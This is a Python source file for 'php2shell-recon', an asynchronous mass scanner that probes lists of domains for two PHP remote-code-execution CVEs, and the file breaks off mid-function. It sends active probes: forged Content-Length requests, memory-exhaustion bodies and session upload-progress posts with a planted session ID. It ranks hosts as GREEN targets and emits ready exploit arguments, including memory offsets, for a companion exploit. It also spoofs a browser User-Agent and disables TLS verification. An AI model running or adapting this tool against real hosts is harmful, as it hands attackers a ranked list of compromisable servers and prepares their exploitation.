#!/usr/bin/env python3
"""
php2shell-recon: bulk target scanner for CVE-2026-109618 / CVE-2026-109619.

Targets are scored and ranked for PHP2Shell exposure.
The exploit itself is not executed; targets are identified and classified.

Usage:
  python3 scan.py --input domains.txt --out results.jsonl
  python3 scan.py --input domains.txt --summary out.csv --concurrency 30
"""
from __future__ import annotations

import argparse
import asyncio
import csv
import datetime
import json
import math
import os
import re
import signal
import sys
import time
from dataclasses import dataclass, field
from typing import Any, Awaitable, Optional
from urllib.parse import urlparse

try:
    import aiohttp
    from aiohttp import ClientSession, ClientTimeout, TCPConnector
    _HAVE_AIOHTTP = True
except ImportError:  # fallback: httpx
    try:
        import httpx
        _HAVE_HTTPX = True
        _HAVE_AIOHTTP = False
    except ImportError:
        sys.stderr.write("HATA: aiohttp veya httpx gerekli.\n")
        sys.stderr.write("pip install aiohttp   (veya)   pip install httpx\n")
        sys.exit(2)

# ------------------------------------------------------------------ config
UA_DEFAULT = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
              "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36")
PHPINFO_PATHS = ["/phpinfo.php", "/info.php", "/test.php",
                 "/php_info.php", "/p.php", "/i.php",
                 "/.user.ini", "/composer.json",
                 "/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000"]
VER_RE = re.compile(rb"PHP[/\s]+(\d+)\.(\d+)\.(\d+)")
VER_RE_H = re.compile(rb"PHP\s+(\d+\.\d+\.\d+)")
BARE_VER_RE = re.compile(rb"^\s*(\d+)\.(\d+)\.(\d+)\s*$")
MEM_RE = re.compile(rb"Allowed memory size of (\d+) bytes exhausted")
POST_RE = re.compile(rb"POST Content-Length of (\d+) bytes exceeds the limit of (\d+) bytes")
MAXVAR_RE = re.compile(rb"Input variables exceeded (\d+)")
# PHPSESSID cookie signature
SID_RE = re.compile(rb"PHPSESSID=([A-Za-z0-9]+)")
CDN_RE = re.compile(
    rb"(cloudflare|CF-RAY|akamai|sucuri|imperva|fastly|incapsula|bigip|f5)",
    re.IGNORECASE)
# Distro signature: Server: Apache (Debian)
DISTRO_RE = re.compile(rb"\(([^()]{2,20})\)")


def parse_ver(raw: bytes | str) -> Optional[tuple[int, int, int]]:
    blob = raw if isinstance(raw, bytes) else raw.encode("latin-1", "replace")
    for rx in (VER_RE, VER_RE_H, BARE_VER_RE):
        m = rx.search(blob)
        if m:
            parts = m.group(1).split(".") if len(m.groups()) == 1 else None
            if parts and len(parts) == 3:
                return (int(parts[0]), int(parts[1]), int(parts[2]))
            return (int(m.group(1)), int(m.group(2)), int(m.group(3)))
    return None


def affected(v: Optional[tuple[int, int, int]]) -> Optional[bool]:
    if v is None:
        return None
    maj, mi, pa = v
    if maj in (5, 6, 7):
        return True
    if maj == 8:
        if mi < 2:
            return True
        if mi == 2 and pa < 35:
            return True
        if mi == 3 and pa < 36:
            return True
        if mi == 4 and pa < 27:
            return True
        if mi == 5 and pa < 12:
            return True
    return False  # version found but outside the affected range


@dataclass
class Rec:
    host: str
    url_used: str = ""
    scheme: str = ""
    final_url: str = ""
    status_code: Optional[int] = None
    server: Optional[str] = None
    server_distro: Optional[str] = None
    php_version: Optional[str] = None
    affected_version: Optional[bool] = None
    sapi: Optional[str] = None
    sapi_confidence: Optional[str] = None
    display_errors: Optional[bool] = None
    memory_limit: Optional[int] = None
    post_max_size: Optional[int] = None
    max_input_vars: Optional[int] = None
    session_upload_progress: Optional[bool] = None
    session_use_cookies: Optional[bool] = None
    session_use_strict_mode: Optional[bool] = None
    phpinfo_path: Optional[str] = None
    cdn: Optional[bool] = None
    exploitability_score: int = 0
    verdict: str = "UNKNOWN"
    notes: list = field(default_factory=list)
    suggested_exploit_args: dict = field(default_factory=dict)
    probed_at: str = ""
    duration_ms: int = 0
    error: Optional[str] = None

    def to_dict(self) -> dict:
        return {
            "host": self.host, "url_used": self.url_used, "scheme": self.scheme,
            "final_url": self.final_url, "status_code": self.status_code,
            "server": self.server, "server_distro": self.server_distro,
            "php_version": self.php_version,
            "affected_version": self.affected_version,
            "sapi": self.sapi, "sapi_confidence": self.sapi_confidence,
            "display_errors": self.display_errors,
            "memory_limit": self.memory_limit,
            "post_max_size": self.post_max_size,
            "max_input_vars": self.max_input_vars,
            "session_upload_progress": self.session_upload_progress,
            "session_use_cookies": self.session_use_cookies,
            "session_use_strict_mode": self.session_use_strict_mode,
            "phpinfo_path": self.phpinfo_path,
            "cdn": self.cdn,
            "exploitability_score": self.exploitability_score,
            "verdict": self.verdict, "notes": self.notes,
            "suggested_exploit_args": self.suggested_exploit_args,
            "probed_at": self.probed_at, "duration_ms": self.duration_ms,
            "error": self.error,
        }


def score(rec: Rec) -> None:
    s = 0
    if rec.affected_version is True:
        s += 25
    elif rec.affected_version is None:
        s += 10
    if rec.sapi == "mod_php":
        s += 20 if rec.sapi_confidence in ("high", None) else 10
    if rec.display_errors is True:
        s += 15
    if rec.session_upload_progress is True:
        s += 10
    if rec.session_use_strict_mode is False:
        s += 10
    if (rec.memory_limit and rec.post_max_size
            and 0 < rec.memory_limit < 12 * 1048576
            and rec.post_max_size >= 12 * 1048576):
        s += 10
    if rec.cdn is True:
        s -= 15
    if "SCHEME_MISMATCH" in rec.notes:
        s -= 10
    rec.exploitability_score = max(0, min(100, s))

    # verdict
    if rec.php_version is None and rec.affected_version is None:
        rec.verdict = "UNKNOWN"
    elif rec.affected_version is True and rec.sapi == "fpm":
        rec.verdict = "YELLOW_FPM"
    elif (rec.affected_version is True and rec.sapi == "mod_php"
          and rec.display_errors is True
          and rec.session_upload_progress is True
          and rec.session_use_strict_mode is False
          and rec.post_max_size is not None and rec.post_max_size >= 12 * 1048576
          and rec.memory_limit is not None and rec.memory_limit < 12 * 1048576
          and rec.exploitability_score >= 75):
        rec.verdict = "GREEN"
    elif rec.affected_version is True and rec.sapi == "mod_php" \
            and rec.display_errors is True:
        rec.verdict = "YELLOW"
    elif rec.affected_version is False or rec.display_errors is False \
            or rec.session_upload_progress is False:
        rec.verdict = "RED"
    else:
        rec.verdict = "UNKNOWN"


def suggest_args(rec: Rec) -> dict:
    if rec.verdict != "GREEN":
        return {}
    ml = rec.memory_limit or 8 * 1048576
    pms = rec.post_max_size or 12 * 1048576
    huge_mb = max(4, min(14, int((ml // 1048576) + 2)))
    huge_mb = min(huge_mb, max(4, pms // 1048576 - 1))
    if rec.post_max_size and rec.post_max_size < 12 * 1048576:
        rec.notes.append("NEEDS_AMPLIFICATION")
    return {
        "-u": f"{rec.url_used}",
        "--huge-mb": huge_mb,
        "--profile": "bookworm",
        "--zif-offset": "0x465370",
        "--dtor-offset": "0x65eb60",
        "--retries": 20,
        "--fetch": "/x",
    }


# ------------------------------------------------------------------ HTTP
class HTTP:
    """aiohttp-based client with a host-scoped cookie jar."""

    def __init__(self, args):
        self.args = args
        self._sessions: dict[str, Any] = {}
        self._lock = asyncio.Lock()
        self._rate_guard = asyncio.Lock()
        self._rate_locks: dict[str, asyncio.Lock] = {}
        self._last_request: dict[str, float] = {}
        self._insecure = args.insecure
        self._timeout_conn = 10
        self._timeout_read = 15

    async def _throttle(self, host: str) -> None:
        """Apply the configured per-host request rate limit."""
        if self.args.rate <= 0:
            return
        async with self._rate_guard:
            lock = self._rate_locks.setdefault(host, asyncio.Lock())
        async with lock:
            interval = 1.0 / self.args.rate
            now = time.monotonic()
            wait_for = self._last_request.get(host, 0.0) + interval - now
            if wait_for > 0:
                await asyncio.sleep(wait_for)
            self._last_request[host] = time.monotonic()

    def _attempts(self) -> int:
        return max(1, self.args.retries + 1)

    async def _get_session(self, host: str) -> Any:
        async with self._lock:
            if host not in self._sessions:
                if _HAVE_AIOHTTP:
                    jar = aiohttp.CookieJar(unsafe=True)
                    sslctx = None
                    if self._insecure:
                        import ssl as _ssl
                        sslctx = _ssl.create_default_context()
                        sslctx.check_hostname = False
                        sslctx.verify_mode = _ssl.CERT_NONE
                    self._sessions[host] = ClientSession(
                        cookie_jar=jar,
                        timeout=ClientTimeout(
                            connect=self._timeout_conn,
                            total=60 if self.args.timeout > 20 else self.args.timeout),
                        connector=TCPConnector(ssl=sslctx),
                        headers={"User-Agent": self.args.ua or UA_DEFAULT},
                    )
                else:
                    self._sessions[host] = httpx.AsyncClient(
                        headers={"User-Agent": self.args.ua or UA_DEFAULT},
                        verify=not self._insecure,
                        timeout=httpx.Timeout(self.args.timeout),
                        proxy=self.args.proxy,
                    )
            return self._sessions[host]

    async def close(self, host: str) -> None:
        async with self._lock:
            s = self._sessions.pop(host, None)
        if s is None:
            return
        try:
            if _HAVE_AIOHTTP:
                await s.close()
            else:
                await s.aclose()
        except Exception:
            pass

    async def get(self, url: str) -> dict:
        host = urlparse(url).hostname or ""
        out = {"ok": False, "status": None, "headers": {}, "body": b"",
               "final_url": url, "error": None}
        for attempt in range(self._attempts()):
            try:
                await self._throttle(host)
                s = await self._get_session(host)
                if _HAVE_AIOHTTP:
                    request_args = {
                        "allow_redirects": True,
                        "max_redirects": 5,
                        "read_bufsize": self.args.max_body,
                    }
                    if self.args.proxy:
                        request_args["proxy"] = self.args.proxy
                    async with s.get(url, **request_args) as resp:
                        out["status"] = resp.status
                        out["final_url"] = str(resp.url)
                        out["headers"] = {k.lower(): v for k, v in resp.headers.items()}
                        body = await resp.read()
                        out["body"] = body[:self.args.max_body]
                else:
                    resp = await s.get(url, follow_redirects=True)
                    out["status"] = resp.status_code
                    out["final_url"] = str(resp.url)
                    out["headers"] = {k.lower(): v for k, v in resp.headers.items()}
                    out["body"] = resp.content[:self.args.max_body]
                out["ok"] = True
                return out
            except Exception as e:
                out["error"] = repr(e)
                if attempt + 1 < self._attempts():
                    await asyncio.sleep(min(2.0, 0.25 * (attempt + 1)))
        return out

    async def post(self, url: str, body: bytes | None = None,
                   headers: dict | None = None,
                   raw_body: bool = False,
                   long_body: bool = False) -> dict:
        host = urlparse(url).hostname or ""
        out = {"ok": False, "status": None, "headers": {}, "body": b"",
               "error": None, "final_url": url}
        for attempt in range(self._attempts()):
            try:
                await self._throttle(host)
                s = await self._get_session(host)
                hdrs = {"Connection": "close"}
                hdrs.update(headers or {})
                if _HAVE_AIOHTTP:
                    post_args = {
                        "data": b"" if raw_body else (body if body is not None else b""),
                        "headers": hdrs,
                        "timeout": ClientTimeout(
                            total=60 if long_body else self.args.timeout),
                        "allow_redirects": True,
                        "max_redirects": 5,
                    }
                    if self.args.proxy:
                        post_args["proxy"] = self.args.proxy
                    async with s.post(url, **post_args) as resp:
                        out["status"] = resp.status
                        out["final_url"] = str(resp.url)
                        out["headers"] = {k.lower(): v for k, v in resp.headers.items()}
                        out["body"] = (await resp.read())[:self.args.max_body]
                else:
                    async with s.stream("POST", url, content=body or b"",
                                        headers=hdrs,
                                        follow_redirects=True) as resp:
                        out["status"] = resp.status_code
                        out["final_url"] = str(resp.url)
                        out["headers"] = {k.lower(): v
                                          for k, v in resp.headers.items()}
                        data = b""
                        async for chunk in resp.aiter_bytes():
                            data += chunk
                            if len(data) > self.args.max_body:
                                break
                        out["body"] = data[:self.args.max_body]
                out["ok"] = True
                return out
            except Exception as e:
                out["error"] = repr(e)
                if attempt + 1 < self._attempts():
                    await asyncio.sleep(min(2.0, 0.25 * (attempt + 1)))
        return out

    async def post_content_length_mismatch(self, url: str,
                                           declared: int) -> dict:
        """P1: Declare a large Content-Length and cut the body short.
        The post_max_size warning is generated during request startup,
        before the body is read. If display_errors=On, it appears in the body."""
        host = urlparse(url).hostname or ""
        out = {"ok": False, "status": None, "headers": {}, "body": b"",
               "error": None, "final_url": url}
        try:
            await self._throttle(host)
            if _HAVE_AIOHTTP:
                # Use a raw socket: large Content-Length, short body, shutdown(WR)
                import socket as _s
                u = urlparse(url)
                port = u.port or (443 if u.scheme == "https" else 80)
                ip = socket_get_ip(u.hostname or "")
                sock = _s.create_connection((ip, port), timeout=self._timeout_conn)
                if u.scheme == "https":
                    import ssl as _ssl
                    ctx = _ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = _ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=u.hostname)
                path = u.path or "/"
                if u.query:
                    path += "?" + u.query
                req = (f"POST {path} HTTP/1.1\r\n"
                       f"Host: {u.hostname}\r\n"
                       f"User-Agent: {self.args.ua or UA_DEFAULT}\r\n"
                       f"Content-Length: {declared}\r\n"
                       f"Content-Type: application/x-www-form-urlencoded\r\n"
                       f"Connection: close\r\n\r\n").encode("latin-1")
                sock.sendall(req + b"a=" + b"x" * 2048)
                sock.shutdown(_s.SHUT_WR)  # Half-close the TCP write side
                sock.settimeout(15)
                data = bytearray()
                while True:
                    try:
                        part = sock.recv(65536)
                    except Exception:
                        break
                    if not part:
                        break
                    data += part
                    if len(data) > self.args.max_body:
                        break
                sock.close()
                raw = bytes(data)
                hend = raw.find(b"\r\n\r\n")
                first = raw.split(b"\r\n", 1)[0]
                out["status"] = int(first.split(b" ", 2)[1]) if b"HTTP/" in first else None
                hb = raw[:hend] if hend > 0 else raw
                for ln in hb.split(b"\r\n")[1:]:
                    if b":" in ln:
                        k, v = ln.split(b":", 1)
                        out["headers"][k.strip().lower().decode("latin-1", "replace")] = \
                            v.strip().decode("latin-1", "replace")
                out["body"] = (raw[hend + 4:] if hend > 0 else b"")[:self.args.max_body]
            else:
                # httpx fallback: override the Content-Length header
                s = await self._get_session(host)
                hdrs = {"Content-Length": str(declared), "Connection": "close"}
                try:
                    async with s.post(url, data=b"a=" + b"x" * 2048,
                                      headers=hdrs,
                                      timeout=httpx.Timeout(30),
                                      follow_redirects=True) as resp:
                        out["status"] = resp.status_code
                        out["headers"] = {k.lower(): v for k, v in resp.headers.items()}
                        out["body"] = resp.content[:self.args.max_body]
                except Exception as e:
                    out["error"] = repr(e)
            out["ok"] = True
            return out
        except Exception as e:
            out["error"] = repr(e)
            return out


def socket_get_ip(host: str) -> str:
    import socket as _s
    try:
        return _s.getaddrinfo(host, None, _s.AF_INET)[0][4][0]
    except Exception:
        return host


# ------------------------------------------------------------------ phpinfo
PHPINFO_KEYS = {
    "php_version": (rb"PHP Version", rb"PHP Version"),
    "server_api": (rb"Server API", rb"Server API"),
    "memory_limit": (rb"memory_limit", rb"Memory limit"),
    "post_max_size": (rb"post_max_size", rb"Post max size"),
    "display_errors": (rb"display_errors", rb"Display errors"),
    "max_input_vars": (rb"max_input_vars", rb"Max input variables"),
    "session_upload_progress": (rb"session.upload_progress.enabled",
                                rb"Upload progress enabled"),
    "session_use_cookies": (rb"session.use_cookies", rb"Use cookies"),
    "session_use_strict_mode": (rb"session.use_strict_mode",
                                rb"Strict mode"),
    "mpm_prefork": (rb"mpm_prefork", rb"Prefork"),
}


def parse_phpinfo(body: bytes) -> dict:
    out: dict[str, Any] = {}
    # Table layout: <td>key</td><td>value</td> or key : value
    text = body.decode("latin-1", "replace")
    # memory_limit / post_max_size: "8M" / "80M" / "128M"
    for key, (rx_a, rx_b) in PHPINFO_KEYS.items():
        pat = re.compile(
            (rx_a.decode("latin-1") + r".*?<[^>]+>\s*([^\s<]+)")
            .encode("latin-1"),
            re.DOTALL | re.IGNORECASE)
        m = pat.search(body)
        if m:
            out[key] = m.group(1).decode("latin-1", "replace")
    # Version
    v = parse_ver(body)
    if v:
        out["php_version"] = ".".join(map(str, v))
    # memory_limit / post_max_size: "8M" -> bytes
    for k in ("memory_limit", "post_max_size"):
        val = out.get(k)
        if val:
            val = val.strip().upper()
            if val.endswith("M"):
                try:
                    out[k] = int(float(val[:-1]) * 1048576)
                except ValueError:
                    out[k] = None
            elif val.endswith("K"):
                try:
                    out[k] = int(float(val[:-1]) * 1024)
                except ValueError:
                    out[k] = None
            elif val in ("-1", "UNLIMITED"):
                out[k] = -1
            else:
                try:
                    out[k] = int(val)
                except ValueError:
                    out[k] = None
    # display_errors: On/Off/1/0
    val = out.get("display_errors")
    if val:
        out["display_errors"] = val.upper() in ("ON", "1")
    val = out.get("session_upload_progress")
    if val:
        out["session_upload_progress"] = val.upper() in ("ON", "1")
    val = out.get("session_use_cookies")
    if val:
        out["session_use_cookies"] = val.upper() in ("ON", "1")
    val = out.get("session_use_strict_mode")
    if val:
        out["session_use_strict_mode"] = val.upper() in ("ON", "1")
    return out


# ------------------------------------------------------------------ probes
class Probes:
    def __init__(self, http: HTTP, args):
        self.http = http
        self.args = args
        self.budget_used = 0
        self.budget = args.probe_budget

    def spend(self, n: int = 1) -> bool:
        if self.budget_used + n > self.budget:
            return False
        self.budget_used += n
        return True

    async def fingerprint(self, url: str, rec: Rec) -> bool:
        """3.1-3.5: headers + phpinfo + version + SAPI.
        Returns True if phpinfo was found (the configuration is available)."""
        out = await self.http.get(url)
        if not out["ok"]:
            rec.error = out["error"]
            return False
        rec.status_code = out["status"]
        rec.final_url = out["final_url"]
        rec.url_used = url
        h = out["headers"]
        rec.server = h.get("server")
        # Distro signature
        if rec.server:
            m = DISTRO_RE.search(rec.server.encode("latin-1", "replace"))
            if m:
                rec.server_distro = m.group(1).decode("latin-1", "replace")
        # CDN/WAF
        cdn_blob = (rec.server or "").encode("latin-1", "replace")
        for k in ("cf-ray", "x-sucuri-id", "x-akamai-serial", "server"):
            v = h.get(k, "")
            if v:
                cdn_blob += v.encode("latin-1", "replace")
        rec.cdn = bool(CDN_RE.search(cdn_blob))
        if rec.cdn:
            rec.notes.append("CDN/WAF behind")
        # PHP version
        ver_raw = h.get("x-powered-by", "")
        if not ver_raw:
            ver_raw = (rec.server or "")
        v = parse_ver(ver_raw)
        if v:
            rec.php_version = ".".join(map(str, v))
        # Set-Cookie: PHPSESSID -> PHP + active session
        setc = h.get("set-cookie", "")
        has_sid = bool(SID_RE.search(setc.encode("latin-1", "replace")))
        # Try phpinfo only if the version was not found
        if rec.php_version is None:
            for p in PHPINFO_PATHS:
                if not self.spend(1):
                    break
                u = url.rstrip("/") + p
                if p.startswith("/?="):
                    u = url + p if "?" not in url else url + "&" + p.lstrip("/?")
                pi = await self.http.get(u)
                if not pi["ok"] or pi["status"] != 200:
                    continue
                parsed = parse_phpinfo(pi["body"])
                if parsed:
                    rec.phpinfo_path = p
                    if "php_version" in parsed:
                        rec.php_version = parsed["php_version"]
                    rec._phpinfo = parsed  # internal
                    break
        if rec.php_version:
            v = parse_ver(rec.php_version)
            rec.affected_version = affected(v)
        elif rec.status_code is not None:
            # Version not found but the site is reachable -> affected status unknown
            rec.affected_version = None
        # SAPI (3.3): exact from phpinfo when available, otherwise heuristic
        sapi_from_info = None
        if hasattr(rec, "_phpinfo"):
            sa = rec._phpinfo.get("server_api", "")
            if "apache2handler" in sa.lower() or "apache 2.0 handler" in sa.lower():
                sapi_from_info = "mod_php"
            elif "fpm" in sa.lower():
                sapi_from_info = "fpm"
            elif "litespeed" in sa.lower():
                sapi_from_info = "litespeed"
            elif "frankenphp" in sa.lower():
                sapi_from_info = "frankenphp"
            elif "cgi" in sa.lower():
                sapi_from_info = "cgi"
        if sapi_from_info:
            rec.sapi = sapi_from_info
            rec.sapi_confidence = "high"
        else:
            srv = (rec.server or "").lower()
            if "nginx" in srv:
                rec.sapi = "fpm"
                rec.sapi_confidence = "medium"
            elif "apache" in srv:
                rec.sapi = "mod_php"
                rec.sapi_confidence = "low"
            elif "litespeed" in srv or "caddy" in srv or "openresty" in srv:
                rec.sapi = "fpm"
                rec.sapi_confidence = "low"
            else:
                rec.sapi = None
                rec.sapi_confidence = "low"
        # HTTP/HTTPS consistency
        if url.startswith("https://"):
            hp = url.replace("https://", "http://", 1)
            if self.spend(1):
                rh = await self.http.get(hp)
                if rh["ok"] and rh["status"] in (200, 301, 302) \
                        and (rec.status_code not in (200,)):
                    rec.notes.append("SCHEME_MISMATCH")
        return rec.phpinfo_path is not None

    async def p1_display_postmax(self, url: str, rec: Rec) -> None:
        """P1: Declare a 1 GB Content-Length, send a short body, shutdown(WR).
        'POST Content-Length ... exceeds the limit of Y' -> post_max_size=Y.
        If the warning appears in the body -> display_errors=1."""
        if not self.spend(1):
            return
        out = await self.http.post_content_length_mismatch(url, 1073741824)
        if not out["ok"]:
            return
        body = out["body"]
        m = POST_RE.search(body)
        if m:
            rec.post_max_size = int(m.group(2))
            rec.display_errors = True
            rec.notes.append("P1: post_max_size from warning")
        else:
            # Determine display_errors from whether the P3 warning appears
            # in the response body (P3 performs the actual check).
            pass

    async def p2_memory_limit(self, url: str, rec: Rec) -> None:
        """P2: Send a body below post_max_size but above memory_limit.
        'Allowed memory size of N bytes exhausted' -> memory_limit=N."""
        # Only for affected + mod_php candidates
        if rec.affected_version is not True:
            return
        if rec.sapi != "mod_php":
            return
        # Progressive sizes: 1, 2, 4, and 6 MB (do not exceed post_max_size)
        pms = rec.post_max_size or (16 * 1048576)
        bodies = []
        for mb in (1, 2, 4, 6):
            size = mb * 1048576
            if size < pms:
                bodies.append((mb, size))
        if not bodies:
            return
        for mb, size in reversed(bodies):  # Largest to smallest
            if not self.spend(1):
                break
            # Body: very small URL-encoded fields (memory amplification)
            n_fields = max(100, size // 1024)
            parts = [f"field_{i}={i}" for i in range(min(n_fields, 5000))]
            body = ("&".join(parts)).encode("latin-1", "replace")
            # Do not exceed post_max_size: reduce the body size
            if len(body) > pms:
                body = body[:pms - 1024]
            out = await self.http.post(
                url, body=body,
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                long_body=True)
            if not out["ok"]:
                continue
            m = MEM_RE.search(out["body"])
            if m:
                rec.memory_limit = int(m.group(1))
                rec.notes.append("P2: memory_limit from fatal")
                return
        # No fatal error -> memory_limit >= largest attempted size * 4
        if bodies:
            rec.memory_limit = bodies[-1][1] * 4
            rec.notes.append("P2: memory_limit >= tried*4 (no fatal)")

    async def p3_max_input_vars(self, url: str, rec: Rec) -> None:
        """P3: Send 1001 URL-encoded fields -> 'Input variables exceeded N'
        -> max_input_vars=N. Also determines display_errors."""
        if not self.spend(1):
            return
        parts = [f"v{i}=x" for i in range(1001)]
        body = ("&".join(parts)).encode("latin-1", "replace")
        out = await self.http.post(
            url, body=body,
            headers={"Content-Type": "application/x-www-form-urlencoded"})
        if not out["ok"]:
            return
        m = MAXVAR_RE.search(out["body"])
        if m:
            rec.max_input_vars = int(m.group(1))
            rec.display_errors = True
            rec.notes.append("P3: max_input_vars from warning")
        elif rec.display_errors is None:
            # No warning -> display_errors=0 (the warning is not exposed in the body)
            rec.display_errors = False

    async def p4_upload_progress(self, url: str, rec: Rec) -> None:
        """P4: multipart + PHP_SESSION_UPLOAD_PROGRESS + file part,
        without a cookie. Set-Cookie: PHPSESSID -> upload_progress=1,
        use_cookies=1."""
        if rec.phpinfo_path:
            return  # configuration is already available
        if not self.spend(1):
            return
        boundary = "----php2shellprobe"
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
            f"pp2shellprobe\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; '
            f'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npwn\r\n'
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="a.txt"\r\n'
            f"Content-Type: text/plain\r\n\r\nhello\r\n"
            f"--{boundary}--\r\n"
        ).encode("latin-1", "replace")
        out = await self.http.post(
            url, body=body,
            headers={"Content-Type":
                     f"multipart/form-data; boundary={boundary}"})
        if not out["ok"]:
            return
        setc = out["headers"].get("set-cookie", "")
        if SID_RE.search(setc.encode("latin-1", "replace")):
            rec.session_upload_progress = True
            rec.session_use_cookies = True
            rec.notes.append("P4: upload_progress + use_cookies ON")
        else:
            rec.session_upload_progress = False
            rec.notes.append("P4: NO_UPLOAD_PROGRESS")

    async def p5_strict_mode(self, url: str, rec: Rec) -> None:
        """P5: P4 + Cookie: PHPSESSID=<32-character new ID>.
        If the same ID is returned, strict_mode=0; otherwise it is 1.
        PHPSESSID is sent as both a cookie and a multipart field."""
        if rec.phpinfo_path:
            return
        if not self.spend(1):
            return
        boundary = "----php2shellprobe2"
        fake_id = "attacksessionid0001abcd"  # 32 char
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n'
            f"{fake_id}\r\n"
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; '
            f'name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npwn\r\n'
            f"--{boundary}--\r\n"
        ).encode("latin-1", "replace")
        out = await self.http.post(
            url, body=body,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
                "Cookie": f"PHPSESSID={fake_id}",
            })
        if not out["ok"]:
            return
        setc = out["headers"].get("set-cookie", "")
        m = SID_RE.search(setc.encode("latin-1", "replace"))
        if m:
            returned = m.group(1).decode("latin-1", "replace")
            if returned == fake_id:
                rec.session_use_strict_mode = False
            else:
                rec.session_use_strict_mode = True


# ------------------------------------------------------------------ target
async def process_target(host: str, http: HTTP, args,
                        done: set[str], queue: asyncio.Queue,
                        write: asyncio.Queue) -> None:
    rec = Rec(host=host)
    t0 = time.time()
    u = urlparse(host)
    if not u.netloc:
        # Domain (not a URL)
        base_url = f"https://{host}"
    else:
        base_url = host if host.startswith("http") else f"https://{host}"

    # Scheme fallback
    url_used = None
    if base_url.startswith("http://"):
        url_used = base_url
        rec.scheme = "http"
    else:
        rec.scheme = "https"
        url_used = base_url
        if not args.no_tls_fallback:
            r = await http.get(url_used)
            if not r["ok"] and r["error"] and (
                    "SSLError" in r["error"] or "ssl" in r["error"].lower()
                    or "ConnectionRefused" in r["error"]
                    or "ConnectionReset" in r["error"]):
                http_url = base_url.replace("https://", "http://", 1)
                r2 = await http.get(http_url)
                if r2["ok"]:
                    url_used = http_url
                    rec.scheme = "http"
                    base_url = http_url

    probes = Probes(http, args)
    try:
        has_info = await probes.fingerprint(url_used, rec)
        # Run the remaining probes within the budget
        # P1: optional active probe
        if args.probe_post_max:
            await probes.p1_display_postmax(url_used, rec)
        # P3: always (cheap, determines display_errors)
        await probes.p3_max_input_vars(url_used, rec)
        # P4/P5: upload_progress + strict mode
        await probes.p4_upload_progress(url_used, rec)
        await probes.p5_strict_mode(url_used, rec)
        # P2: optional active probe for affected + mod_php targets
        if args.probe_memory:
            await probes.p2_memory_limit(url_used, rec)
    except Exception as e:
        rec.error = repr(e)
    finally:
        rec.probed_at = datetime.datetime.now(
            datetime.timezone.utc).isoformat()
        rec.duration_ms = int((time.time() - t0) * 1000)
        score(rec)
        rec.suggested_exploit_args = suggest_args(rec)

    await put_result(write, rec)
    await http.close(urlparse(url_used).hostname or host)


async def put_result(write: asyncio.Queue, rec: Rec) -> None:
    await write.put(rec)


# ------------------------------------------------------------------ driver
class Driver:
    def __init__(self, args):
        self.args = args
        self.done: set[str] = set()
        self.results: list[Rec] = []
        self.lock = asyncio.Lock()
        self.cancelled = False
        self._out_fh: Any = None
        self._write_q: asyncio.Queue = asyncio.Queue()

    def load_done(self) -> None:
        p = self.args.out
        if os.path.exists(p):
            with open(p, "r", encoding="utf-8") as f:
                for ln in f:
                    ln = ln.strip()
                    if not ln:
                        continue
                    try:
                        d = json.loads(ln)
                        if "host" in d:
                            self.done.add(d["host"])
                    except Exception:
                        pass

    async def writer(self) -> None:
        while True:
            rec: Rec = await self._write_q.get()
            if rec is None:
                break
            async with self.lock:
                self.results.append(rec)
                with open(self.args.out, "a", encoding="utf-8") as f:
                    f.write(json.dumps(rec.to_dict(), ensure_ascii=False) + "\n")
                if not self.args.quiet:
                    print(f"[{rec.verdict:10}] {rec.host:40} "
                          f"php={rec.php_version or '?':10} "
                          f"sapi={rec.sapi or '?':8} "
                          f"score={rec.exploitability_score}", flush=True)

    async def run(self) -> None:
        if self.args.jsonl_append:
            self.load_done()
        else:
            with open(self.args.out, "w", encoding="utf-8"):
                pass
        # Target list
        targets: list[str] = []
        with open(self.args.input, "r", encoding="utf-8",
                  errors="replace") as f:
            for ln in f:
                ln = ln.strip()
                if not ln or ln.startswith("#"):
                    continue
                if (ln.lower().startswith("http://")
                        and not self.args.include_http):
                    continue
                host = urlparse(ln).netloc or ln
                if host in self.done:
                    continue
                targets.append(ln)
        if not self.args.quiet:
            print(f"Targets: {len(targets)} (skipped: {len(self.done)})", flush=True)

        http = HTTP(self.args)
        sem = asyncio.Semaphore(self.args.concurrency)
        tasks: list[asyncio.Task] = []

        async def work(t: str) -> None:
            async with sem:
                if self.cancelled:
                    return
                await process_target(t, http, self.args,
                                     self.done, self._write_q, self._write_q)

        for t in targets:
            if self.cancelled:
                break
            tasks.append(asyncio.create_task(work(t)))

        # Ctrl+C
        loop = asyncio.get_running_loop()

        def _sig():
            if not self.args.quiet:
                print("\n[!] Interrupted - writing partial results...", flush=True)
            self.cancelled = True

        for sigc in (signal.SIGINT, signal.SIGTERM):
            try:
                loop.add_signal_handler(sigc, _sig)
            except Exception:
                pass

        # Start the writer
        writer_task = asyncio.create_task(self.writer())

        # Process targets
        # Wait for tasks to finish (stop.wait() or Ctrl+C)
        await asyncio.gather(*tasks, return_exceptions=True)

        # Send None to stop the writer
        await self._write_q.put(None)
        await writer_task

    def summarize(self) -> None:
        from collections import Counter
        c: Counter = Counter(r.verdict for r in self.results)
        total = len(self.results)
        if self.args.quiet:
            pass
        else:
            print("\n" + "=" * 50, flush=True)
            print(f"TOTAL: {total}", flush=True)
            for k, v in c.most_common():
                print(f"  {k}: {v}", flush=True)
            greens = sorted(
                (r for r in self.results if r.verdict == "GREEN"),
                key=lambda r: -r.exploitability_score)[:20]
            if greens:
                print("\nTop 20 GREEN targets:", flush=True)
                for r in greens:
                    print(f"  {r.exploitability_score:3} {r.url_used}", flush=True)
            print("=" * 50, flush=True)

        # green_targets.txt
        with open("green_targets.txt", "w", encoding="utf-8") as f:
            for r in self.results:
